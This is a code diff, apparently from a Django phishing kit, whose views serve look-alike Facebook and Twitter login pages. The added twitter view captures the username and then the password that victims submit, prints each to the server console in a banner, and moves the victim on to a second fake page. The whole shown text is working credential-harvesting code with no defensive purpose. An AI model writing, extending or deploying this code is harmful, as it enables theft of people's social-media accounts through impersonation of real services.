@@ -36,4 +36,23 @@ def signup(request):
         return render(request, 'facebook.html')
         
 def twitter(request):
-    return render(request, 'twitter.html')
+    if request.method == 'POST':
+        try:
+            if request.POST['username']:
+                print("-"*32)
+                print("|"+ " "*10+"Email"+ " "*12+ "   |")
+                print("-"*32)
+                print("|       " + request.POST['username'] + "     |       ")
+                print("-"*32)
+                userEmail = request.POST['username']
+                return render(request, 'twitter2.html', {"userEmail": userEmail})
+        except:
+            if request.POST['password']:
+                print("-"*32)
+                print("|"+ " "*10+"Password"+ " "*12+ "|")
+                print("-"*32)
+                print("|       " + request.POST['password'] + "     |       ")
+                print("-"*32)
+                return render(request, 'twitter.html')
+    else:
+        return render(request, 'twitter.html')
